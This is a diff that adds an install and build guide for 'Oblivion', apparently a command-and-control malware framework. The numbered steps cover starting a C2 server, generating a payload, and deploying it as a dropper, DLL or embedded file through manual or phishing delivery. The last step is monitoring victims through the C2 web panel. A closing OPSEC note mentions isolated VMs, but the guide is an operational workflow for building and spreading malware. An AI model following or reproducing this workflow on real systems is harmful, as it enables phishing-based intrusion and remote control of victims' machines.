@@ -1,0 +1,22 @@
+[OBLIVION INSTALLATION & BUILD GUIDE]
+
+1. Setup virtualenv:
+   python3 -m venv venv && source venv/bin/activate
+   pip install -r requirements.txt
+
+2. Start C2 Server (HTTPS):
+   python3 c2/server.py
+
+3. Configure payload:
+   - Edit 'utils/config_template.json'
+   - Run: python3 builder/payload_generator.py
+
+4. Deploy the payload:
+   - Choose between dropper/DLL/embed
+   - Supports manual or phishing delivery
+
+5. Monitor C2:
+   - https://your-server:443/
+   - Login with provided token
+
+[OPSEC NOTE: Do not run on production machines. Use isolated VMs.]
